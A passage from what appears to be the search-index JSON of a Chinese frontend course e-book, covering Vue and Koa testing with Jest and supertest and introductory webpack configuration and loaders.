\u7684\u8bed\u6cd5\n  it('test es6 click btn', async () =&gt; {\n    expect(wrapper.text()).toContain('0');\n    const btn = wrapper.find('button');\n    btn.trigger('click');\n    await Vue.nextTick();\n    expect(wrapper.text()).toContain('1');\n  });\n});\n</code></pre> <p>\u89e3\u91ca\uff1a\u70b9\u51fb\u540e\uff0c\u66f4\u65b0\u4f1a\u5f15\u53d1 DOM \u53d8\u5316\uff0c\u9700\u8981\u4f7f\u7528 Vue.nextTick \u7b49\u5f85 Vue \u5b8c\u6210 DOM \u66f4\u65b0\u3002</p> <p>\u53ef\u4ee5\u628a vue-test-utils.vuejs.org \u4e2d\u7684\u5168\u90e8\u6848\u4f8b\u6572\u4e00\u6b21\uff0c\u8fd9\u6837\u57fa\u672c\u7684 VUE \u6d4b\u8bd5\u5c31\u6ca1\u95ee\u9898\u4e86\u3002</p>"},{"location":"ebook-kaikeba-frontend/11-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/#api","title":"api \u5f02\u6b65\u51fd\u6570\u6d4b\u8bd5","text":"<pre><code>import axios from 'axios';\n\nexport default {\n  data() {\n    return {\n      value: null\n    }\n  },\n  methods: {\n    async fetchResults() {\n      const response = await axios.get('mock/service');\n      this.value = response.data;\n    }\n  }\n}\n</code></pre> <p>\u8fd9\u6837\u53ef\u4ee5 mock \u5047\u6570\u636e\u6d4b\u8bd5</p> <pre><code>import { shallowMount } from '@vue/test-utils';\nimport Foo from './Foo';\n\njest.mock('axios');\n\nit('fetch async when btn clicked', () =&gt; {\n  const wrapper = shallowMount(Foo);\n  wrapper.find('button').trigger('click');\n  expect(wrapper.vm.value).toBe('value');\n});\n</code></pre> <p>\u5982\u679c\u662f ts \u66f4\u6539\u914d\u7f6e</p> <pre><code>npm install --save-dev ts-jest\n</code></pre> <p>package.json \u66f4\u6539\u914d\u7f6e\uff08\u6b63\u5219\u5339\u914d\u5165\u53e3\uff09</p> <pre><code>{\n  \"jest\": {\n    \"transform\": {\n      \"^.+\\\\.tsx?$\": 'ts-jest'\n    }\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/11-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/#node-koa","title":"node \u4e2d\u7684\u6d4b\u8bd5\uff08koa\uff09","text":"<p>\u901a\u5e38\u9700\u8981\u767b\u5f55\u9a8c\u8bc1\uff0c\u6216\u8005\u6570\u636e\u83b7\u53d6</p> <pre><code>describe('test koa', () =&gt; {\n  beforeAll(() =&gt; {\n    fs.writeFileSync('../db.json', JSON.stringify({}));\n  });\n  afterAll(() =&gt; {\n    fs.removeFileSync('../db.json', JSON.stringify({}));\n  })\n  it('read data', () =&gt; {\n    let db = new Kdb('db.json');\n    expect(db.getState()).toEqual({});\n  })\n  it('read key', () =&gt; {\n    let db = new Kdb('db.json');\n    expect(db.get('todos').read()).toEqual([]);\n  })\n})\n</code></pre> <p>\u4e2d\u95f4\u4ef6\u6d4b\u8bd5</p> <pre><code>const request = require('supertest');\nconst assert = require('assert');\nconst Koa = require('koa');\n\ndescribe('app content', () =&gt; {\n  const app1 = new Koa();\n  app1.context.msg = 'MichaelAn';\n  const app2 = new Koa();\n\n  it('merge perperties', () =&gt; {\n    app1.use((ctx, next) =&gt; {\n      assert.equal(ctx.msg, 'MichaelAn');\n      ctx.body = 'xx';\n      ctx.status = 200;\n    });\n    return request(app1.listen())\n    .get('/')\n    .expect('xx')\n    .expect(200)\n  });\n})\n</code></pre> <p>\u9644\u52a01\uff1a\u81ea\u5b9a\u4e49 github \u5fbd\u7ae0\uff1ahttps://shields.io/</p> <p>\u9644\u52a02\uff1agithub \u6709\u65f6\u5019\u7f51\u901f\u5f88\u6162\uff0c\u514b\u9686\u4ee3\u7801\u8f83\u6162\u6280\u5de7\uff1a\u6253\u5f00 gitee \u7801\u4e91\uff0c\u4ece github \u5bfc\u5165\u5230\u7801\u4e91\uff0c\u7136\u540e\u76f4\u63a5\u4e0b\u8f7d\uff1bgitee \u5e94\u8be5\u505a\u4e86\u4e00\u4e0b\u7f13\u5b58\u548c\u4ee3\u7406\uff0c\u8fd9\u6837\u4e0b\u8f7d\u4ee3\u7801\u5c31\u5f88\u5feb\u4e86\u3002\u7136\u540e\u66f4\u65b0\u4ee3\u7801\u65f6\uff0c\u53ef\u4ee5\u66f4\u6539 remote source\u3002</p> <p>\u9644\u52a03\uff1acloc \u53ef\u4ee5\u7edf\u8ba1\u67d0\u4e2a\u76ee\u5f55\u4e0b\u9762\u7684\u6587\u4ef6\u7c7b\u578b\u548c\u6570\u91cf\uff08\u901a\u5e38\u6d4b\u8bd5\u6587\u4ef6\u662f\u4ee3\u7801\u76842\u500d\uff09</p>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/","title":"Day1 webpack\u914d\u7f6e\u6982\u5ff5","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 15404  \u9605\u8bfb31\u5206\u949f</p> <p>2021-10-25 \u4ee5\u8003\u4ee3\u7ec3\uff1a</p> <ul> <li>\u6982\u8ff0 Webpack \u4e3b\u8981\u4ec0\u4e48\u7528\u9014\uff0c\u600e\u4e48\u5b89\u88c5\uff0cchunk bundle \u6a21\u5757\u7684\u6982\u5ff5\uff1f</li> <li>\u6838\u5fc3\u7684\u914d\u7f6e\u54ea\u4e9b\uff1f\u56db\u4e2a\uff1b\u5355\u5165\u53e3\u548c\u591a\u5165\u53e3\u600e\u4e48\u914d\u7f6e\uff1f</li> <li>loader \u662f\u4ec0\u4e48\u7528\u9014\uff0c\u5e38\u7528\u7684\u4e94\u4e2aloader\u662f\u4ec0\u4e48\uff0c\u5177\u4f53\u600e\u4e48\u4f7f\u7528</li> <li>plugin \u662f\u4ec0\u4e48\u7528\u9014\uff0c\u5e38\u7528\u7684\u4e24\u4e2a\u662f\u4ec0\u4e48\uff1f</li> </ul>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#1webpack","title":"1.webpack\u7b80\u4ecb","text":"<p>webpack is a module bundler (\u6a21\u5757\u6253\u5305\u5de5\u5177)</p> <p>Webpack\u662f\u4e00\u4e2a\u6253\u5305\u6a21\u5757\u5316 JavaScript \u7684\u5de5\u5177\uff0c\u5b83\u4f1a\u4ece\u5165\u53e3\u6a21\u5757\u51fa\u53d1\uff0c\u8bc6\u522b\u51fa\u6e90\u7801\u4e2d\u7684\u6a21\u5757\u5316\u5bfc\u5165\u8bed\uf906\uff0c\u9012\u5f52\u5730\u627e\u51fa\u5165\u53e3\u6587\u4ef6\u7684\u6240\u6709\u4f9d\u8d56\uff0c\u5c06\u2f0a\u53e3\u548c\u5176\u6240\u6709\u7684\u4f9d\u8d56\uff0c\u6253\u5305\u5230\u4e00\u4e2a\u5355\u72ec\u7684\u6587\u4ef6\u4e2d\uff0c\u662f\u5de5\u7a0b\u5316\u3001\u81ea\u52a8\u5316\u601d\u60f3\u5728\u524d\u7aef\u5f00\u53d1\u4e2d\u7684\u4f53\u73b0\u3002</p> <p>\u5b98\u2f45\u7f51\u7ad9\uff1ahttps://webpack.js.org/ \u5f53\u524d\u7248\u672c\u4e3a 5.73.x\u3002</p>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#2webpack","title":"2.\u5b89\u88c5webpack","text":"<p>\u73af\u5883\u51c6\u5907\uff1a\u9700\u8981 nodeJS\uff0c\u7248\u672c\u53c2\u8003\u5b98\u2f79\u53d1\u5e03\u7684\u6700\u65b0\u7248\u672c\uff0c\u65b0\u7248\u672c\u53ef\u4ee5\u63d0\u5347 webpack \u7684\u6253\u5305\u901f\u5ea6</p> <p>\u5168\u5c40\u5b89\u88c5 \uf967\u63a8\u8350</p> <pre><code># \u5b89\u88c5webpack V4+\u7248\u672c\u65f6\uff0c\u9700\u8981\u989d\u5916\u5b89\u88c5webpack-cli\nnpm install webpack webpack-cli -g\nwebpack -v\nnpm uninstall webpack webpack-cli -g\n</code></pre> <p>\u5168\u5c40\u5b89\u88c5 webpack\uff0c\u4f1a\u5c06\u4f60\u9879\u2f6c\u4e2d\u7684 webpack \u9501\u5b9a\u5230\u6307\u5b9a\u7248\u672c\uff0c\u9020\u6210\u4e0d\u540c\u7684\u9879\u2f6c\u4e2d\u56e0\u4e3a webpack \u4f9d\u8d56\u4e0d\u540c\u7248\u672c\u2f7d\u800c\u5bfc\u81f4\u51b2\u7a81\uff0c\u6784\u5efa\u5931\u8d25\u3002</p> <p>\u9879\u2f6c\u5b89\u88c5 \u63a8\u8350</p> <pre><code>npm install webpack webpack-cli -D\n</code></pre> <pre><code># \u5b89\u88c5\u6700\u65b0\u7684\u7a33\u5b9a\u7248\u672c\nnpm i -D webpack\n\n# \u5b89\u88c5\u6307\u5b9a\u7248\u672c\nnpm i -D webpack@&lt;version&gt;\n\n# \u5b89\u88c5\u6700\u65b0\u7684\u4f53\u9a8c\u7248\u672c \u53ef\u80fd\u5305\u542bbug, \u4e0d\u8981\u7528\u4e8e\u2f63\u751f\u4ea7\u73af\u5883\nnpm i -D webpack@beta\n\n# \u5b89\u88c5webpack V4+\u7248\u672c\u65f6\uff0c\u9700\u8981\u989d\u5916\u5b89\u88c5webpack-cli\nnpm i -D webpack-cli\n</code></pre> <p>\u68c0\u67e5\u5b89\u88c5</p> <pre><code>webpack -v\n# \u53ef\u80fd\u51fa\u73b0\u62a5\u9519\uff1acommand not found \u9ed8\u8ba4\u5728\u5168\u5c40\u73af\u5883\u4e2d\u67e5\u627e\uff0c\u5168\u5c40\u73af\u5883\u4e0b\u9762\u6ca1\u6709\u5b89\u88c5 webpack\n\nnpx webpack -v\n# npx\u5e2e\u52a9\u6211\u4eec\u5728\u9879\u76ee\u4e2d\u7684node_modules\u2fa5\u67e5\u627e webpack\n\n./node_modules/.bin/webpack -v\n# //\u5230\u5f53\u524d\u7684node_modules\u6a21\u5757\u91cc\uf9e9\u6307\u5b9awebpack\n</code></pre>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#3webpack","title":"3.\u542f\u52a8webpack\u6267\u2f8f\u6784\u5efa","text":"<p>1 Chunk = 1 bundle</p> <p>chunk \u662f\u865a\u62df\u7684\u4ee3\u7801\u5757</p> <p>bundle \u662f\u751f\u6210\u7684\u8d44\u6e90\u2f42\u4ef6</p> <p>1\u4e2achunk\u53ef\u4ee5\u662f\u591a\u4e2a\u6a21\u5757\u7ec4\u6210\u7684</p> <p>\u6a21\u5757\uff1anodeJS\u2fa5 \u4e07\u7269\u7686\u6a21\u5757</p> <p>entry \u7684\u6570\u636e\u7c7b\u578b\uff1a\u5b57\u7b26\u4e32\u3001\u6570\u7ec4\u3001\u5bf9\u8c61\u3002</p> <p>\u5b57\u7b26\u4e32\u548c\u6570\u7ec4\u7684\u6548\u679c\u57fa\u672c\u4e00\u6837\uff0c\u6700\u540e\u90fd\u662f\u5355\u4e00\u5165\u53e3\u3002\u9ed8\u8ba4\u662f\u5b57\u7b26\u4e32\u3002</p> <p>\u5982\u679c entry \u662f\u6570\u7ec4: webpack\u4f1a\u2f83\u52a8\u2f63\u751f\u6210\u53e6\u5916\u2f00\u4e2a\u5165\u2f1d\u6a21\u5757\uff0c\u5e76\u5c06\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u6307\u5b9a\u7684\u6a21\u5757\u52a0\u8f7d\u8fdb\u6765\uff0c\u5e76\u5c06\u6700\u540e\u2f00\u4e2a\u6a21\u5757\u7684 module.exports \u4f5c\u4e3a\u5165\u2f1d\u6a21\u5757 \u7684module.exports\u5bfc\u51fa\u3002</p> <p>\u5982\u679c entry \u662f\u5bf9\u8c61\u591a\u952e\u503c\uff0c\u5bf9\u5e94\u591a\u4e2a chunk\uff0c\u624d\u662f\u591a\u4e2a\u6253\u5305\uff0c\u591a\u9875\u9762\u5e94\u7528\u3002</p>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#31-webpack","title":"3.1- webpack\u9ed8\u8ba4\u914d\u7f6e","text":"<ul> <li>webpack\u9ed8\u8ba4\u2f40\u6301JS\u6a21\u5757\u548cJSON\u6a21\u5757</li> <li>\u652f\u6301CommonJS Es moudule AMD CMD\u7b49\u6a21\u5757\u7c7b\u578b</li> <li>webpack4\u2f40\u6301\u96f6\u914d\u7f6e\u4f7f\u2f64,\u4f46\u662f\u5f88\u5f31\uff0c\u7a0d\u5fae\u590d\u6742\u4e9b\u7684\u573a\u666f\u90fd\u9700\u8981 \u989d\u5916\u6269\u5c55</li> </ul>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#32-","title":"3.2- \u51c6\u5907\u6267\u2f8f\u6784\u5efa","text":"<p>\u65b0\u5efasrc\u2f42\u4ef6\u5939\uff0c\u65b0\u5efasrc/index.js\u3001src/index.json\u3001src/other.js</p> <pre><code>// index.js\nconst json = require(\"./index.json\"); //commonJS\nimport { add } from \"./other.js\"; //es module\nconsole.log(json, add(2, 3));\n</code></pre> <p>index.json</p> <pre><code>{\n  \"name\": \"JOSN\"\n}\n</code></pre> <pre><code>// other.js\nexport function add(n1, n2) {\n  return n1 + n2;\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#33","title":"3.3 \u6267\ufa08\u6784\u5efa","text":"<pre><code># npx\u2f45\u65b9\u5f0f\nnpx webpack\n\n# \u5199\u5165 npm script\nnpm run build\n\n\"scripts\": {\n  \"build\": \"webpack\"\n},\n</code></pre> <p>\u4fee\u6539 package.json \u2f42\u4ef6:</p> <p>\u539f\u7406\u5c31\u662f\u901a\u8fc7 shell \u811a\u672c\u5728 node_modules/.bin \u2f6c\u5f55\u4e0b\u521b\u5efa\u2f00\u4e2a\u8f6f\u94fe\u63a5\u3002</p>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#34-","title":"3.4-\u6784\u5efa\u6210\u529f","text":"<p>\u6211\u4eec\u4f1a\u53d1\u73b0\u2f6c\u5f55\u4e0b\u591a\u51fa\u2f00\u4e2a dist \u2f6c\u5f55\uff0c\u2fa5\u2faf\u6709\u4e2a main.js \uff0c\u8fd9\u4e2a\u2f42\u4ef6\u662f\u2f00\u4e2a\u53ef\u6267\u2f8f\u7684JavaScript\u2f42\u4ef6\uff0c\u2fa5\u2faf\u5305\u542b webpackBootstrap \u542f\u52a8\u51fd\u6570\u3002</p>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#35-","title":"3.5-\u9ed8\u8ba4\u914d\u7f6e","text":"<pre><code>const path = require(\"path\");\n\nmodule.exports = {\n  // \u5fc5\u586b webpack\u6267\u2f8f\u6784\u5efa\u5165\u2f1d\n  entry: \"./src/index.js\",\n  output: {\n    // \u5c06\u6240\u6709\u4f9d\u8d56\u7684\u6a21\u5757\uff0c\u5408\u5e76\u8f93\u51fa\u5230 main.js\n    filename: \"[name].[hash6].js\",\n    // \u8f93\u51fa\u2f42\u4ef6\u7684\u5b58\u653e\u8def\u5f84\uff0c\u5fc5\u987b\u662f\u7edd\u5bf9\uf937\u5f84\n        path: path.resolve(__dirname, \"./dist\")\n    }\n};\n</code></pre>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#4webpack","title":"4.webpack\u914d\u7f6e\u6838\u2f3c\u6982\u5ff5","text":"<p>\u96f6\u914d\u7f6e\u662f\u5f88\u5f31\u7684\uff0c\u7279\u5b9a\u7684\u9700\u6c42\uff0c\u603b\u662f\u9700\u8981\u2f83\u2f30\u5df1\u8fdb\u2f8f\u914d\u7f6e</p> <p>webpack\u6709\u9ed8\u8ba4\u7684\u914d\u7f6e\u2f42\u4ef6\uff0c\u53eb webpack.config.js \uff0c\u6211\u4eec\u53ef\u4ee5\u5bf9\u8fd9\u4e2a\u2f42\u4ef6\u8fdb\u2f8f\u4fee\u6539\uff0c\u8fdb\u2f8f\u4e2a\u6027\u5316\u914d\u7f6e</p> <p>\u4f7f\u2f64\u9ed8\u8ba4\u7684\u914d\u7f6e\u2f42\u4ef6: webpack.config.js</p> <p>\u4e0d\u4f7f\u2f64\u2f83\u5b9a\u4e49\u914d\u7f6e\u2f42\u4ef6: \u2f50\u5982 webpackconfig.js\uff0c\u53ef\u4ee5\u901a\u8fc7 -- config webpackconfig.js \u6765\u6307\u5b9a webpack \u4f7f\u2f64\u54ea\u4e2a\u914d\u7f6e\u2f42\u4ef6\u6765 \u6267\u2f8f\u6784\u5efa</p> <p>webpack.config.js\u914d\u7f6e\u57fa\u7840\u7ed3\u6784</p> <pre><code>module.exports = {\n  entry: \"./src/index.js\", //\u6253\u5305\u5165\u2f1d\u2f42\u4ef6\n  output: \"./dist\", //\u8f93\u51fa\u7ed3\u6784\n  mode: \"production\", //\u6253\u5305\u73af\u5883\n  module: {\n    rules: [ //loader\u6a21\u5757\u5904\u7406\n      {\n        test: /\\.css$/,\n        use: \"style-loader\"\n      }\n    ]\n  },\n  //\u63d2\u4ef6\u914d\u7f6e\n  plugins: [\n    new HtmlWebpackPlugin()\n  ]\n};\n</code></pre>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#41-entry","title":"4.1-entry:","text":"<p>\u6307\u5b9awebpack\u6253\u5305\u5165\u2f1d\u2f42\u4ef6:Webpack \u6267\u2f8f\u6784\u5efa\u7684\u7b2c\u2f00\u6b65\u5c06\u4ece Entry \u5f00\u59cb\uff0c\u53ef\u62bd\u8c61\u6210\u8f93\u5165</p> <pre><code>//\u5355\u5165\u2f1d SPA\uff0c\u672c\u8d28\u662f\u4e2a\u5b57\u7b26\u4e32\nentry:{\n  main: './src/index.js'\n}\n// ==\u76f8\u5f53\u4e8e\u7b80\u5199=== entry:\"./src/index.js\"\n</code></pre> <pre><code>//\u591a\u5165\u2f1d entry\u662f\u4e2a\u5bf9\u8c61\nentry:{\n  index:\"./src/index.js\",\n  login:\"./src/login.js\"\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#42-output","title":"4.2-output:","text":"<p>\u6253\u5305\u8f6c\u6362\u540e\u7684\u2f42\u4ef6\u8f93\u51fa\u5230\u78c1\u76d8\u4f4d\u7f6e:\u8f93\u51fa\u7ed3\u679c\uff0c\u5728 Webpack \u7ecf\u8fc7\u2f00\u7cfb\uf99c\u5904\u7406\u5e76\u5f97\u51fa\u6700\u7ec8\u60f3\u8981\u7684\u4ee3\u7801\u540e\u8f93\u51fa\u7ed3\u679c\u3002</p> <p><pre><code>output: {\n  filename: \"bundle.js\",//\u8f93\u51fa\u2f42\u4ef6\u7684\u540d\u79f0\n  path: path.resolve(__dirname, \"dist\")//\u8f93\u51fa\u2f42\u4ef6\u5230\n},\n\n//\u591a\u5165\u2f1d\u7684\u5904\u7406\noutput: {\n  filename: \"[name][chunkhash:8].js\",//\u5229\u5229\u2f64\u5360\u4f4d\u7b26\uff0c \u2f42\u4ef6\u540d\u79f0\u4e0d\u8981\u91cd\u590d\n  path: path.resolve(__dirname, \"dist\")//\u8f93\u51fa\u2f42\u4ef6\u5230\u78c1\u76d8\u7684\u2f6c\u5f55\uff0c\u5fc5\u987b\u662f\u7edd\u5bf9\u8def\u5f84\n},\n</code></pre> ! \u78c1\u76d8\u7684\u2f6c\u5f55\uff0c\u5fc5\u987b\u662f\u7edd\u5bf9\u8def\u5f84</p>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#43-mode","title":"4.3-mode","text":"<p>Mode\u2f64\u6765\u6307\u5b9a\u5f53\u524d\u7684\u6784\u5efa\u73af\u5883\u3002\u8bbe\u7f6emode\u53ef\u4ee5\u2f83\u52a8\u89e6\u53d1webpack\u5185\u7f6e\u7684\u51fd\u6570\uff0c\u8fbe\u5230\u4f18\u5316\u7684\u6548\u679c\u3002</p> <p>production\uff1aDefinePlugin \u4e2d\u73af\u5883\u53d8\u91cf process.env.NODE_ENV \u8bbe\u7f6e\u4e3a production\uff0c\u542f\u7528 FlagDependencyUsagePlugin\uff0cFlagIncludedChunksPlugin, ModuleConcatenationPlugin, NoEmitOnErrorsPlugin, OccurreneceOrderPlugin, SideEffectsPlugin TerserPlugin \u63d2\u4ef6\u3002</p> <p>development\uff1a DefinePlugin \u4e2d\u73af\u5883\u53d8\u91cf process.env.NODE_ENV \u8bbe\u7f6e\u4e3a development\u3002\u542f\u7528 NamedChunksPlugin \u548c NamedModulesPlugin\u3002</p> <p>none\uff1a\u4e0d\u8fdb\u884c\u4efb\u4f55\u4f18\u5316</p> <p>NODE_ENV \u4e0d\u4f1a\u81ea\u52a8\u8bbe\u7f6e mode</p> <p>\u5f00\u53d1\u9636\u6bb5\u7684\u5f00\u542f\u4f1a\u6709\u5229\u5229\u4e8e\u70ed\u66f4\u66f4\u65b0\u7684\u5904\u7406\uff0c\u8bc6\u522b\u54ea\u4e2a\u6a21\u5757\u53d8\u5316</p> <p>\u751f\u4ea7\u9636\u6bb5\u7684\u5f00\u542f\u4f1a\u6709\u5e2e\u52a9\u6a21\u5757\u538b\u7f29\uff0c\u5904\u7406\u526f\u4f5c\u2f64\u7b49\u2f00\u4e9b\u529f\u80fd</p>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#44-module","title":"4.4-module","text":"<p>\u6a21\u5757\uff0c\u5728 Webpack \u2fa5\u2f00\u5207\u7686\u6a21\u5757\uff0c\u2f00\u4e2a\u6a21\u5757\u5bf9\u5e94\u7740\u2f00\u4e2a\u2f42\u4ef6\u3002 Webpack \u4f1a\u4ece\u914d\u7f6e\u7684 Entry \u5f00\u59cb\u9012\u5f52\u627e\u51fa\u6240\u6709\u4f9d\u8d56\u7684\u6a21\u5757\u3002</p> <p>\u5f53webpack\u5904\u7406\u5230\u4e0d\u8ba4\u8bc6\u7684\u6a21\u5757\u65f6\uff0c\u9700\u8981\u5728webpack\u4e2d\u7684module \u5904\u8fdb\u2f8f\u914d\u7f6e\uff0c\u5f53\u68c0\u6d4b\u5230\u662f\u4ec0\u4e48\u683c\u5f0f\u7684\u6a21\u5757\uff0c\u4f7f\u2f64\u4ec0\u4e48loader\u6765\u5904\u7406\u3002</p> <pre><code>module:{\n  rules:[\n    {\n      test:/\\.xxx$/,//\u6307\u5b9a\u5339\u914d\u89c4\u5219 \n      use:{\n        loader: 'xxx-load'//\u6307\u5b9a\u4f7f\u2f64\u7684loader\n      }\n    }\n  ]\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#5-loader","title":"5. Loader","text":"<p>Webpack \u9ed8\u8ba4\u53ea\u2f40\u6301.json \u548c .js\u6a21\u5757 \u4e0d\u2f40\u6301 \u4e0d\u8ba4\u8bc6\u5176\u4ed6\u683c\u5f0f\u7684\u6a21\u5757</p> <p>\u6a21\u5757\u89e3\u6790\uff0c\u6a21\u5757\u8f6c\u6362\u5668\u5668\uff0c\u2f64\u4e8e\u628a\u6a21\u5757\u539f\u5185\u5bb9\u6309\u7167\u9700\u6c42\u8f6c\u6362\u6210\u65b0\u5185\u5bb9\u3002</p> <p>webpack\u662f\u6a21\u5757\u6253\u5305\u2f2f\u5de5\u5177\uff0c\u2f7d\u800c\u6a21\u5757\u4e0d\u4ec5\u4ec5\u662fjs\uff0c\u8fd8\u53ef\u4ee5\u662fcss\uff0c\u56fe\u2f5a\u6216\u8005\u5176\u4ed6\u683c\u5f0f\u3002</p> <p>\u4f46\u662fwebpack\u9ed8\u8ba4\u53ea\u77e5\u9053\u5982\u4f55\u5904\u7406js\u548cJSON\u6a21\u5757\uff0c\u90a3\u4e48\u5176\u4ed6\u683c\u5f0f\u7684\u6a21\u5757\u5904\u7406\uff0c\u548c\u5904\u7406\u2f45\u65b9\u5f0f\u5c31\u9700\u8981loader\u4e86</p> <p>\u5e38\u2ec5\u7684loader\uff1astyle-loader, css-loader, less-loader, sass-loader, ts-loader, babel-loader, file-loader, eslint-loader \u7b49\u7b49</p>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#51-file-loader","title":"5.1 file loader","text":"<ul> <li>loader: file-loader:\u5904\u7406\u9759\u6001\u8d44\u6e90\u6a21\u5757\uff0c\u539f\u7406\u662f\u628a\u6253\u5305\u5165\u2f1d\u4e2d\u8bc6\u522b\u51fa\u7684\u8d44\u6e90\u6a21\u5757\uff0c\u79fb\u52a8\u5230\u8f93\u51fa\u2f6c\u5f55\uff0c\u5e76\u4e14\u8fd4\u56de\u2f00\u4e2a\u5730\u5740\u540d\u79f0</li> <li>\u4f7f\u7528\u573a\u666f: \u5c31\u662f\u5f53\u6211\u4eec\u9700\u8981\u6a21\u5757\uff0c\u4ec5\u4ec5\u662f\u4ece\u6e90\u4ee3\u7801\u632a\u79fb\u5230\u6253\u5305\u2f6c\u5f55\uff0c\u5c31\u53ef\u4ee5\u4f7f\u2f64file-loader\u6765\u5904\u7406\uff0ctxt\uff0csvg\uff0ccsv\uff0cexcel\uff0c\u56fe\u2f5a\u8d44\u6e90</li> </ul> <pre><code> npm install file-loader -D\n</code></pre> <p>\u6848\u4f8b:</p> <pre><code>module: {\n  rules: [\n    {\n      test: /.(png|jpe?g|gif)$/, //use\u4f7f\u2f64\u2f00\u4e2aloader\u53ef\u4ee5\u2f64\u5bf9\u8c61\uff0c\u5b57\u7b26\u4e32\uff0c\u4e24\u4e2aloader\u9700\u8981\u2f64\u6570\u7ec4\n      use: {\n        loader: \"file-loader\",\n        // options\u989d\u5916\u7684\u914d\u7f6e\uff0c\u2f50\u5982\u8d44\u6e90\u540d\u79f0\n        options: {\n          // placeholder \u5360\u4f4d\u7b26 [name]\u8001\u8d44\u6e90\u6a21\u5757\u7684\u540d\u79f0 [ext]\u2f7c\u8d44\u6e90\u6a21\u5757\u7684\u540e\u7f00\n          // https://webpack.js.org/loaders/file-loader#placeholders\n          name: \"[name]_[hash].[ext]\",\n          //\u6253\u5305\u540e\u7684\u5b58\u653e\u4f4d\u7f6e\n          outputPath: \"images/\"\n        }\n      }\n    }\n  ]\n},\n</code></pre> <p>\u5b9e\u4f8b</p> <pre><code>import pic from \"./logo.png\";\nvar img = new Image();\nimg.src = pic;\nimg.classList.add(\"logo\");\nvar root = document.getElementById(\"root\");\nroot.append(img);\n</code></pre> <p>\u5904\u7406\u5b57\u4f53 https://www.iconfont.cn/?spm=a313x.7781069.199 8910419.d4d0a486a</p> <pre><code>//css\n@font-face {\n  font-family: \"webfont\";\n  font-display: swap;\n  src: url(\"webfont.woff2\") format(\"woff2\");\n}\n\nbody {\n  background: blue;\n  font-family: \"webfont\" !important;\n}\n</code></pre> <pre><code>//webpack.config.js\n{\n  test: /\\.(eot|ttf|woff|woff2|svg)$/,\n  use: \"file-loader\"\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#52-url-loader","title":"5.2 url-loader","text":"<p>url-loader \u662f file-loader\u52a0\u5f3a\u7248\u672c</p> <p>url-loader\u5185\u90e8\u4f7f\u2f64\u4e86\uf9bafile-loader,\u6240\u4ee5\u53ef\u4ee5\u5904\u7406file-loader\u6240\u6709 \u7684\u4e8b\u60c5\uff0c\u4f46\u662f\u9047\u5230jpg\u683c\u5f0f\u7684\u6a21\u5757\uff0c\u4f1a\u628a\u8be5\u56fe\u2f5a\u8f6c\u6362\u6210base64\u683c \u5f0f\u5b57\u7b26\u4e32\uff0c\u5e76\u6253\u5305\u5230js\u2fa5\u3002\u5bf9\u2f29\u4f53\u79ef\u7684\u56fe\u2f5a\u6bd4\u8f83\u5408\u9002\uff0c\u2f24\u56fe\u2f5a\u4e0d\u5408\u9002\u3002</p> <pre><code> npm install url-loader -D\n</code></pre> <p>\u6848\u4f8b\uff1a</p> <pre><code>module: {\n  rules: [\n    {\n      test: /\\.(png|jpe?g|gif)$/,\n      use: {\n        loader: \"url-loader\",\n        options: {\n          name: \"[name]_[hash].[ext]\",\n          outputPath: \"images/\", //\u2f29\u4e8e2048\uff0c\u624d\u8f6c\u6362\u6210base64\n          limit: 2048\n        }\n      }\n    }\n  ]\n},\n</code></pre>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#53-css-loader","title":"5.3 css-loader","text":"<p>\u6837\u5f0f\u5904\uf9e4:</p> <p>Css-loader \u5206\u6790css\u6a21\u5757\u4e4b\u95f4\u7684\u5173\u7cfb\uff0c\u5e76\u5408\u6210\u2f00\u4e2acss</p> <p>Style-loader \u4f1a\u628acss-loader\u2f63\u751f\u6210\u7684\u5185\u5bb9\uff0c\u4ee5style\u6302\u8f7d\u5230\u2eda\u2faf\u7684heade\u90e8\u5206</p> <pre><code> npm install style-loader css-loader -D\n</code></pre> <pre><code>{\n  test: /\\.css$/,\n  use: [\"style-loader\", \"css-loader\"]\n}\n</code></pre> <pre><code>{\n  test:/\\.css$/,\n  use:\n    [\n      {\n        loader:\"style-loader\",\n        options: {\n          injectType: \"singletonStyleTag\" // \u5c06\u6240\u6709\u7684style\u6807\u7b7e\u5408\u5e76\u6210\u2f00\u4e2a\n        }\n      },\n      \"css-loader\"\n    ]\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#54-less-loader","title":"5.4 less-loader","text":"<p>Less\u6837\u5f0f\u5904\u7406</p> <p>less-load \u628aless\u8bed\u6cd5\u8f6c\u6362\u6210css</p> <pre><code> $ npm install less less-loader --save-dev\n</code></pre> <p>\u6848\u4f8b\uf9b5: loader\u6709\u987a\u5e8f\uff0c\u4ece\u53f3\u5230\u5de6\uff0c\u4ece\u4e0b\u5230\u4e0a</p> <pre><code>{\n  test: /\\.scss$/,\n  use: [\"style-loader\", \"css-loader\", \"less-loader\"]\n}\n</code></pre> <p>\u6837\u5f0f\u2f83\u52a8\u6dfb\u52a0\u524d\u7f00:</p> <p>https://caniuse.com/</p>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#55-postcss-loader","title":"5.5 Postcss-loader","text":"<pre><code>npm i  postcss-loader autoprefixer -D\n</code></pre> <p>\u65b0\u5efapostcss.config.js</p> 